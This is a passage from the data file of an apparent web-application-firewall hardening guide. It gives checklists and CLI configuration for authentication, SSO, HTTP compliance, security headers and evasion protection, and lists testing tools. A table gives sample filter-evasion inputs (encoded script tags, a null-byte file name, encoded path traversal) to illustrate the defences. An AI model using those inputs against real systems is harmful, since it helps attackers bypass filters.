                    <div><span class="code-command">claim-validation</span> <span class="code-value">add</span> <span class="code-param">claim</span> <span class="code-value">"iat"</span> <span class="code-param">type</span> <span class="code-value">"required"</span></div>
                    <div><span class="code-command">claim-validation</span> <span class="code-value">add</span> <span class="code-param">claim</span> <span class="code-value">"nbf"</span> <span class="code-param">type</span> <span class="code-value">"optional"</span></div>
                    <div><span class="code-command">claim-validation</span> <span class="code-value">add</span> <span class="code-param">claim</span> <span class="code-value">"iss"</span> <span class="code-param">type</span> <span class="code-value">"required"</span> <span class="code-param">value</span> <span class="code-value">"https://auth.example.com/"</span></div>
                    <div><span class="code-command">claim-validation</span> <span class="code-value">add</span> <span class="code-param">claim</span> <span class="code-value">"aud"</span> <span class="code-param">type</span> <span class="code-value">"required"</span> <span class="code-param">value</span> <span class="code-value">"https://api.example.com/"</span></div>
                    <div class="code-comment"># Configure token location</div>
                    <div><span class="code-param">token-location</span> <span class="code-value">add</span> <span class="code-param">header</span> <span class="code-value">"Authorization"</span> <span class="code-param">prefix</span> <span class="code-value">"Bearer "</span></div>
                    <div><span class="code-param">token-location</span> <span class="code-value">add</span> <span class="code-param">cookie</span> <span class="code-value">"access_token"</span></div>
                    <div class="code-comment"># Configure scope validation</div>
                    <div><span class="code-command">url-scope-mapping</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/api/admin/*"</span> <span class="code-param">required-scope</span> <span class="code-value">"admin"</span></div>
                    <div><span class="code-command">url-scope-mapping</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/api/users/*"</span> <span class="code-param">required-scope</span> <span class="code-value">"user:read"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Federated Authentication Configuration',
            content: `
                <p class="mb-4 text-gray-700">Configure secure SAML and OpenID Connect integration for single sign-on (SSO) functionality.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure SAML authentication</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">federated-auth</span></div>
                    <div><span class="code-command">saml</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">assertion-consumer-url</span> <span class="code-value">"/saml/acs"</span></div>
                    <div><span class="code-param">entity-id</span> <span class="code-value">"https://www.example.com/saml/metadata"</span></div>
                    <div class="code-comment"># Configure identity provider</div>
                    <div><span class="code-command">identity-provider</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"corporate-idp"</span></div>
                    <div><span class="code-command">identity-provider</span> <span class="code-value">"corporate-idp"</span></div>
                    <div><span class="code-param">metadata-url</span> <span class="code-value">"https://idp.example.org/metadata.xml"</span></div>
                    <div><span class="code-param">certificate-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">assertion-signature-validation</span> <span class="code-value">required</span></div>
                    <div><span class="code-param">response-signature-validation</span> <span class="code-value">required</span></div>
                    <div><span class="code-command">exit</span></div>
                    
                    <div class="code-comment"># Configure OpenID Connect</div>
                    <div><span class="code-command">oidc</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">client-id</span> <span class="code-value">"web-portal-client"</span></div>
                    <div><span class="code-param">client-secret</span> <span class="code-value">encrypt</span></div>
                    <div><span class="code-param">redirect-uri</span> <span class="code-value">"/oidc/callback"</span></div>
                    <div><span class="code-param">discovery-url</span> <span class="code-value">"https://auth.example.org/.well-known/openid-configuration"</span></div>
                    <div><span class="code-param">scopes</span> <span class="code-value">"openid profile email"</span></div>
                    <div class="code-comment"># Configure validation parameters</div>
                    <div><span class="code-param">id-token-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">access-token-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">validate-nonce</span> <span class="code-value">yes</span></div>
                    <div><span class="code-param">pkce-method</span> <span class="code-value">"S256"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">SSO Security Considerations</h5>
                <p class="mb-4 text-gray-700">When implementing federated authentication, address these critical security concerns:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li>Validate all signatures on SAML assertions and responses</li>
                    <li>Enforce strict audience validation to prevent token reuse attacks</li>
                    <li>Implement proper XML validation to prevent XXE and other XML attacks</li>
                    <li>Configure short-lived assertions with proper NotBefore/NotOnOrAfter validation</li>
                    <li>Protect against SAML authentication bypass via NameID manipulation</li>
                    <li>Implement proper CORS configuration for OAuth/OIDC flows</li>
                    <li>Use state parameters and CSRF tokens in OAuth redirects</li>
                    <li>Enforce PKCE for OAuth authorization code flows</li>
                </ul>
            `
        }
    ],
    tools: [
        {
            title: 'Authentication Tester',
            icon: 'fa-unlock',
            description: 'Tools to test login security and brute force protection effectiveness.',
            link: 'https://www.kali.org/tools/hydra/',
            linkText: 'Hydra'
        },
        {
            title: 'Session Analyzer',
            icon: 'fa-cookie',
            description: 'Analyze session tokens for randomness, security flags, and proper implementation.',
            link: 'https://www.zaproxy.org/',
            linkText: 'OWASP ZAP'
        },
        {
            title: 'Path Traversal Tester',
            icon: 'fa-folder-open',
            description: 'Test for directory traversal vulnerabilities with various bypass techniques.',
            link: 'https://github.com/payloadbox/directory-traversal-payload-list',
            linkText: 'Payload List'
        },
        {
            title: 'JWT Analyzer',
            icon: 'fa-key',
            description: 'Tools for testing and analyzing JSON Web Tokens for security vulnerabilities.',
            link: 'https://jwt.io/',
            linkText: 'JWT.io'
        },
        {
            title: 'OAuth/OIDC Tester',
            icon: 'fa-exchange-alt',
            description: 'Test OAuth 2.0 and OpenID Connect implementations for security issues.',
            link: 'https://oauth.tools/',
            linkText: 'OAuth Tools'
        },
        {
            title: 'SAML Raider',
            icon: 'fa-id-badge',
            description: 'Burp Suite extension for testing SAML-based single sign-on implementations.',
            link: 'https://github.com/portswigger/saml-raider',
            linkText: 'GitHub'
        },
        {
            title: 'Burp Suite Professional',
            icon: 'fa-bug',
            description: 'Comprehensive web security testing platform with specialized authentication testing modules.',
            link: 'https://portswigger.net/burp',
            linkText: 'Website'
        },
        {
            title: 'OWASP ZAP Authentication Add-on',
            icon: 'fa-plug',
            description: 'ZAP extension for testing various authentication mechanisms including OAuth and SAML.',
            link: 'https://www.zaproxy.org/docs/desktop/addons/authentication/',
            linkText: 'Documentation'
        },
        {
            title: 'Token Revocation Tester',
            icon: 'fa-ban',
            description: 'Tool for validating token revocation mechanisms in OAuth 2.0 implementations.',
            link: 'https://www.microfocus.com/en-us/cyberres/identity-access-management',
            linkText: 'Information'
        },
        {
            title: 'SSO-Scan',
            icon: 'fa-search',
            description: 'Specialized scanner for detecting single sign-on implementation vulnerabilities.',
            link: 'https://github.com/Voulnet/sso-scan',
            linkText: 'GitHub'
        }
    ]
},
        {
    id: 'protocol',
    title: '4. HTTP Protocol Validation',
    subtitle: 'Protocol compliance, header validations, and content-type enforcement',
    icon: 'fa-file-code',
    priority: 'high',
    progress: 8,
    checklist: [
        {
            title: '4.1 HTTP Protocol Compliance',
            icon: 'fa-check-double',
            items: [
                { id: '4.1.1', text: 'Enforce HTTP RFC compliance standards', priority: 'high' },
                { id: '4.1.2', text: 'Set maximum allowed HTTP header size', priority: 'medium' },
                { id: '4.1.3', text: 'Configure maximum URL length restrictions', priority: 'high' },
                { id: '4.1.4', text: 'Set allowed HTTP methods (GET, POST, etc.)', priority: 'critical' },
                { id: '4.1.5', text: 'Configure HTTP version restrictions', priority: 'medium' },
                { id: '4.1.6', text: 'Enable validation of HTTP request format', priority: 'high' },
                { id: '4.1.7', text: 'Implement protection against HTTP method tampering (VERB tampering)', priority: 'high' },
                { id: '4.1.8', text: 'Configure protection against HTTP request smuggling', priority: 'critical' },
                { id: '4.1.9', text: 'Set up HTTP header folding checks', priority: 'medium' },
                { id: '4.1.10', text: 'Implement HTTP/0.9 and HTTP/1.0 request restrictions', priority: 'medium' },
                { id: '4.1.11', text: 'Configure chunked transfer encoding validation', priority: 'high' },
                { id: '4.1.12', text: 'Set up protection against HTTP response splitting', priority: 'critical' },
                { id: '4.1.13', text: 'Validate transfer-encoding and content-length header combinations', priority: 'critical' },
                { id: '4.1.14', text: 'Implement normalization of line breaks in headers', priority: 'medium' }
            ]
        },
        {
            title: '4.2 Request Header Validation',
            icon: 'fa-heading',
            items: [
                { id: '4.2.1', text: 'Set required and optional HTTP headers', priority: 'high' },
                { id: '4.2.2', text: 'Configure content-type header validation', priority: 'critical' },
                { id: '4.2.3', text: 'Set up host header validation', priority: 'critical' },
                { id: '4.2.4', text: 'Implement referer header protection policies', priority: 'medium' },
                { id: '4.2.5', text: 'Configure user-agent validation', priority: 'medium' },
                { id: '4.2.6', text: 'Set cookie header validation rules', priority: 'high' },
                { id: '4.2.7', text: 'Prevent header injection attacks', priority: 'high' },
                { id: '4.2.8', text: 'Implement protection against malicious headers', priority: 'high' },
                { id: '4.2.9', text: 'Configure length restrictions for header values', priority: 'medium' },
                { id: '4.2.10', text: 'Set up character set validation for header values', priority: 'medium' },
                { id: '4.2.11', text: 'Implement authorization header validation', priority: 'critical' },
                { id: '4.2.12', text: 'Configure proxy header validation (X-Forwarded-For, etc.)', priority: 'high' },
                { id: '4.2.13', text: 'Set up validation for custom application headers', priority: 'high' },
                { id: '4.2.14', text: 'Define allowed origin header values for CORS', priority: 'high' }
            ]
        },
        {
            title: '4.3 Response Validation',
            icon: 'fa-reply',
            items: [
                { id: '4.3.1', text: 'Configure security-related response headers', priority: 'critical' },
                { id: '4.3.2', text: 'Set up Content-Security-Policy headers', priority: 'high' },
                { id: '4.3.3', text: 'Implement X-XSS-Protection headers', priority: 'high' },
                { id: '4.3.4', text: 'Configure X-Frame-Options for clickjacking protection', priority: 'high' },
                { id: '4.3.5', text: 'Set up HSTS (HTTP Strict Transport Security)', priority: 'high' },
                { id: '4.3.6', text: 'Configure X-Content-Type-Options: nosniff', priority: 'medium' },
                { id: '4.3.7', text: 'Set up Referrer-Policy headers', priority: 'medium' },
                { id: '4.3.8', text: 'Implement Feature-Policy/Permissions-Policy headers', priority: 'medium' },
                { id: '4.3.9', text: 'Configure response body inspection for sensitive data leakage', priority: 'high' },
                { id: '4.3.10', text: 'Set up cache control header validation', priority: 'medium' },
                { id: '4.3.11', text: 'Implement Cross-Origin-Embedder-Policy (COEP) headers', priority: 'medium' },
                { id: '4.3.12', text: 'Configure Cross-Origin-Opener-Policy (COOP) headers', priority: 'medium' },
                { id: '4.3.13', text: 'Set up Cross-Origin-Resource-Policy (CORP) headers', priority: 'medium' },
                { id: '4.3.14', text: 'Implement validation of Server header information disclosure', priority: 'medium' }
            ]
        },
        {
            title: '4.4 HTTP Evasion Protection',
            icon: 'fa-user-secret',
            items: [
                { id: '4.4.1', text: 'Configure protection against URL encoding evasion', priority: 'critical' },
                { id: '4.4.2', text: 'Set up multi-layer URL decoding', priority: 'high' },
                { id: '4.4.3', text: 'Implement Unicode/UTF-8 normalization', priority: 'high' },
                { id: '4.4.4', text: 'Configure null byte injection protection', priority: 'critical' },
                { id: '4.4.5', text: 'Set up backslash normalization', priority: 'medium' },
                { id: '4.4.6', text: 'Implement alternative character representation handling', priority: 'high' },
                { id: '4.4.7', text: 'Configure protection against comment-based evasion techniques', priority: 'medium' },
                { id: '4.4.8', text: 'Set up protection against HTTP parameter pollution', priority: 'high' },
                { id: '4.4.9', text: 'Implement protection against UTF-7 encoding attacks', priority: 'medium' },
                { id: '4.4.10', text: 'Configure homograph attack protection', priority: 'medium' },
                { id: '4.4.11', text: 'Set up protection against overlong UTF-8 encoding', priority: 'high' },
                { id: '4.4.12', text: 'Implement base64/hex decoding for obfuscated payloads', priority: 'high' },
                { id: '4.4.13', text: 'Configure HTML entity encoding normalization', priority: 'high' },
                { id: '4.4.14', text: 'Set up protection against whitespace manipulation attacks', priority: 'medium' }
            ]
        },
        {
            title: '4.5 Content Encoding Validation',
            icon: 'fa-compress-alt',
            items: [
                { id: '4.5.1', text: 'Validate content-encoding header values', priority: 'high' },
                { id: '4.5.2', text: 'Configure maximum compression ratio limits', priority: 'high' },
                { id: '4.5.3', text: 'Set up protection against compression bombs', priority: 'critical' },
                { id: '4.5.4', text: 'Implement validation of nested compression', priority: 'high' },
                { id: '4.5.5', text: 'Configure supported compression algorithms', priority: 'medium' },
                { id: '4.5.6', text: 'Set up validation of compressed content size', priority: 'high' },
                { id: '4.5.7', text: 'Implement decompression timeout limits', priority: 'medium' },
                { id: '4.5.8', text: 'Configure protection against malformed compression data', priority: 'high' },
                { id: '4.5.9', text: 'Set up BREACH/CRIME attack mitigation', priority: 'high' },
                { id: '4.5.10', text: 'Implement zlib/deflate validation', priority: 'medium' }
            ]
        },
        {
            title: '4.6 HTTP/2 and HTTP/3 Validation',
            icon: 'fa-network-wired',
            items: [
                { id: '4.6.1', text: 'Configure HTTP/2 protocol validation', priority: 'high' },
                { id: '4.6.2', text: 'Implement HTTP/2 header compression (HPACK) validation', priority: 'high' },
                { id: '4.6.3', text: 'Set up HTTP/2 stream prioritization controls', priority: 'medium' },
                { id: '4.6.4', text: 'Configure HTTP/2 settings frame validation', priority: 'high' },
                { id: '4.6.5', text: 'Implement protection against HTTP/2 slow read attacks', priority: 'high' },
                { id: '4.6.6', text: 'Set up validation of HTTP/2 frame sizes', priority: 'medium' },
                { id: '4.6.7', text: 'Configure HTTP/3 QUIC protocol validation', priority: 'high' },
                { id: '4.6.8', text: 'Implement HTTP/3 connection validation', priority: 'high' },
                { id: '4.6.9', text: 'Set up HTTP/3 header compression (QPACK) validation', priority: 'medium' },
                { id: '4.6.10', text: 'Configure protection against HTTP/2 & HTTP/3 specific exploits', priority: 'critical' }
            ]
        }
    ],
    techniques: [
        {
            title: 'HTTP Protocol Compliance Configuration',
            content: `
                <p class="mb-4 text-gray-700">Enforce strict HTTP protocol compliance to prevent evasion techniques and protocol-based attacks.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure HTTP protocol compliance</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">http-compliance</span></div>
                    <div><span class="code-param">mode</span> <span class="code-value">strict</span></div>
                    <div><span class="code-param">max-header-length</span> <span class="code-value">8192</span></div>
                    <div><span class="code-param">max-url-length</span> <span class="code-value">2048</span></div>
                    <div><span class="code-param">max-headers</span> <span class="code-value">50</span></div>
                    <div><span class="code-param">allowed-methods</span> <span class="code-value">GET POST PUT DELETE HEAD OPTIONS</span></div>
                    <div><span class="code-param">block-invalid-headers</span> <span class="code-value">true</span></div>
                    <div><span class="code-param">require-host-header</span> <span class="code-value">true</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">HTTP Request Smuggling Protection</h5>
                <p class="mb-4 text-gray-700">HTTP request smuggling vulnerabilities can lead to cache poisoning, response queue poisoning, and security bypasses.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure protection against HTTP request smuggling</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">http-compliance</span></div>
                    <div><span class="code-param">prevent-request-smuggling</span> <span class="code-value">true</span></div>
                    <div><span class="code-param">validate-content-length</span> <span class="code-value">strict</span></div>
                    <div><span class="code-param">validate-chunked-encoding</span> <span class="code-value">strict</span></div>
                    <div><span class="code-param">block-duplicate-headers</span> <span class="code-value">true</span></div>
                    <div><span class="code-param">normalize-line-folding</span> <span class="code-value">true</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced HTTP Compliance Settings</h5>
                <p class="mb-4 text-gray-700">Configure additional HTTP compliance settings to protect against more sophisticated attacks:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced HTTP compliance settings</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">http-compliance</span></div>
                    <div class="code-comment"># HTTP version restrictions</div>
                    <div><span class="code-param">allowed-http-versions</span> <span class="code-value">HTTP/1.1 HTTP/2</span></div>
                    <div><span class="code-param">block-http-0.9</span> <span class="code-value">true</span></div>
                    <div class="code-comment"># Response splitting protection</div>
                    <div><span class="code-param">prevent-response-splitting</span> <span class="code-value">true</span></div>
                    <div><span class="code-param">normalize-line-breaks</span> <span class="code-value">true</span></div>
                    <div class="code-comment"># Method validation</div>
                    <div><span class="code-param">strict-method-validation</span> <span class="code-value">true</span></div>
                    <div><span class="code-param">block-non-rfc-methods</span> <span class="code-value">true</span></div>
                    <div><span class="code-param">method-case-sensitivity</span> <span class="code-value">enforce-uppercase</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Security Headers Implementation',
            content: `
                <p class="mb-4 text-gray-700">Configure security headers to enhance client-side security and prevent common web vulnerabilities.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure security headers</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">security-headers</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">header</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Content-Security-Policy"</span> <span class="code-param">value</span> <span class="code-value">"default-src 'self'; script-src 'self' https://trusted-cdn.com;"</span></div>
                    <div><span class="code-command">header</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"X-XSS-Protection"</span> <span class="code-param">value</span> <span class="code-value">"1; mode=block"</span></div>
                    <div><span class="code-command">header</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"X-Frame-Options"</span> <span class="code-param">value</span> <span class="code-value">"SAMEORIGIN"</span></div>
                    <div><span class="code-command">header</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"X-Content-Type-Options"</span> <span class="code-param">value</span> <span class="code-value">"nosniff"</span></div>
                    <div><span class="code-command">header</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Strict-Transport-Security"</span> <span class="code-param">value</span> <span class="code-value">"max-age=31536000; includeSubDomains"</span></div>
                    <div><span class="code-command">header</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Referrer-Policy"</span> <span class="code-param">value</span> <span class="code-value">"strict-origin-when-cross-origin"</span></div>
                    <div><span class="code-command">header</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Permissions-Policy"</span> <span class="code-param">value</span> <span class="code-value">"camera=(), microphone=(), geolocation=(self)"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Security Header Descriptions</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li><strong>Content-Security-Policy (CSP):</strong> Restricts sources of content, preventing XSS and data injection attacks</li>
                    <li><strong>X-XSS-Protection:</strong> Enables browser's built-in XSS filter</li>
                    <li><strong>X-Frame-Options:</strong> Prevents clickjacking by controlling iframe embedding</li>
                    <li><strong>X-Content-Type-Options:</strong> Prevents MIME type sniffing and content-type confusion attacks</li>
                    <li><strong>Strict-Transport-Security (HSTS):</strong> Forces HTTPS connections</li>
                    <li><strong>Referrer-Policy:</strong> Controls information sent in the Referer header</li>
                    <li><strong>Permissions-Policy:</strong> Controls browser feature permissions</li>
                </ul>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced Security Headers</h5>
                <p class="mb-4 text-gray-700">Configure additional modern security headers for enhanced protection:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced security headers</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">security-headers</span></div>
                    <div class="code-comment"># Cross-Origin isolation headers</div>
                    <div><span class="code-command">header</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Cross-Origin-Embedder-Policy"</span> <span class="code-param">value</span> <span class="code-value">"require-corp"</span></div>
                    <div><span class="code-command">header</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Cross-Origin-Opener-Policy"</span> <span class="code-param">value</span> <span class="code-value">"same-origin"</span></div>
                    <div><span class="code-command">header</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Cross-Origin-Resource-Policy"</span> <span class="code-param">value</span> <span class="code-value">"same-origin"</span></div>
                    <div class="code-comment"># Cache control</div>
                    <div><span class="code-command">header</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Cache-Control"</span> <span class="code-param">value</span> <span class="code-value">"no-store, max-age=0"</span> <span class="code-param">for-urls</span> <span class="code-value">"/admin/*, /account/*"</span></div>
                    <div class="code-comment"># Enhanced CSP configuration</div>
                    <div><span class="code-command">header</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Content-Security-Policy-Report-Only"</span> <span class="code-param">value</span> <span class="code-value">"default-src 'self'; report-uri /csp-violations"</span></div>
                    <div class="code-comment"># Remove sensitive headers</div>
                    <div><span class="code-command">header</span> <span class="code-value">remove</span> <span class="code-param">name</span> <span class="code-value">"Server"</span></div>
                    <div><span class="code-command">header</span> <span class="code-value">remove</span> <span class="code-param">name</span> <span class="code-value">"X-Powered-By"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'HTTP Evasion Techniques Protection',
            content: `
                <p class="mb-4 text-gray-700">Configure protection against various encoding and evasion techniques used to bypass security controls.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure protection against evasion techniques</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">evasion-protection</span></div>
                    <div><span class="code-param">url-decoding-passes</span> <span class="code-value">3</span></div>
                    <div><span class="code-param">unicode-normalization</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">null-byte-protection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">backslash-normalization</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">case-insensitive-matching</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">alternative-encoding-detection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">path-normalization</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Common Evasion Techniques</h5>
                <p class="mb-4 text-gray-700">Examples of encoding and evasion techniques that attackers use to bypass security filters:</p>
                
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Technique</th>
                            <th class="p-3 border bg-gray-100">Example</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">URL Encoding</td>
                            <td class="p-3 border"><code>%3Cscript%3E</code></td>
                            <td class="p-3 border">Encoding &lt;script&gt; as hex values</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Double Encoding</td>
                            <td class="p-3 border"><code>%253Cscript%253E</code></td>
                            <td class="p-3 border">Encoding the % character itself</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Unicode Encoding</td>
                            <td class="p-3 border"><code>\\u003Cscript\\u003E</code></td>
                            <td class="p-3 border">Using Unicode representation</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Alternative UTF-8</td>
                            <td class="p-3 border"><code>%C0%BC</code></td>
                            <td class="p-3 border">Overlong UTF-8 encoding</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Null Byte Injection</td>
                            <td class="p-3 border"><code>script%00.jpg</code></td>
                            <td class="p-3 border">Using null bytes to truncate strings</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Path Traversal Variants</td>
                            <td class="p-3 border"><code>..%c0%af..%c0%af</code></td>
                            <td class="p-3 border">Alternate separator encoding</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced Evasion Protection</h5>
                <p class="mb-4 text-gray-700">Configure additional protections against sophisticated evasion techniques:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced evasion protections</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">evasion-protection</span></div>
                    <div class="code-comment"># HTML entity decoding</div>
                    <div><span class="code-param">html-entity-decoding</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">html-entity-decoding-passes</span> <span class="code-value">2</span></div>
                    <div class="code-comment"># Base64/Hex decoding for obfuscated payloads</div>
                    <div><span class="code-param">base64-decoding</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">hex-decoding</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Homograph attack protection</div>
                    <div><span class="code-param">homograph-detection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">homograph-unicode-normalization</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Whitespace manipulation protection</div>
                    <div><span class="code-param">whitespace-normalization</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">collapse-multiple-whitespace</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Comment detection</div>
                    <div><span class="code-param">detect-sql-comments</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">detect-html-comments</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'HTTP/2 and HTTP/3 Security Configuration',
            content: `
                <p class="mb-4 text-gray-700">Configure security settings specific to HTTP/2 and HTTP/3 protocols to prevent new classes of vulnerabilities.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure HTTP/2 security settings</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">http2-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># HPACK validation</div>
                    <div><span class="code-param">hpack-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">hpack-table-size-limit</span> <span class="code-value">4096</span></div>
                    <div class="code-comment"># Stream and frame controls</div>
                    <div><span class="code-param">max-concurrent-streams</span> <span class="code-value">100</span></div>
                    <div><span class="code-param">max-frame-size</span> <span class="code-value">16384</span></div>
                    <div><span class="code-param">max-header-list-size</span> <span class="code-value">8192</span></div>
                    <div class="code-comment"># Protection against slow read attacks</div>
                    <div><span class="code-param">stream-idle-timeout</span> <span class="code-value">30</span></div>
                    <div><span class="code-param">connection-window-size</span> <span class="code-value">65535</span></div>
                    <div class="code-comment"># HTTP/2 settings validation</div>
                    <div><span class="code-param">validate-settings-frame</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">validate-window-update</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">validate-priority-frame</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">HTTP/3 QUIC Protocol Security</h5>
                <p class="mb-4 text-gray-700">Configure security settings for HTTP/3 and the underlying QUIC protocol:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure HTTP/3 security settings</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">http3-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># QUIC connection validation</div>
                    <div><span class="code-param">quic-idle-timeout</span> <span class="code-value">30</span></div>
                    <div><span class="code-param">max-concurrent-bidi-streams</span> <span class="code-value">100</span></div>
                    <div><span class="code-param">max-concurrent-uni-streams</span> <span class="code-value">50</span></div>
                    <div class="code-comment"># QPACK validation</div>
                    <div><span class="code-param">qpack-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">qpack-blocked-streams</span> <span class="code-value">16</span></div>
                    <div><span class="code-param">qpack-table-size</span> <span class="code-value">4096</span></div>
                    <div class="code-comment"># QUIC specific DoS protections</div>
                    <div><span class="code-param">prevent-address-migration-attacks</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">prevent-retry-attacks</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">validate-initial-packets</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">HTTP/2 and HTTP/3 Security Considerations</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
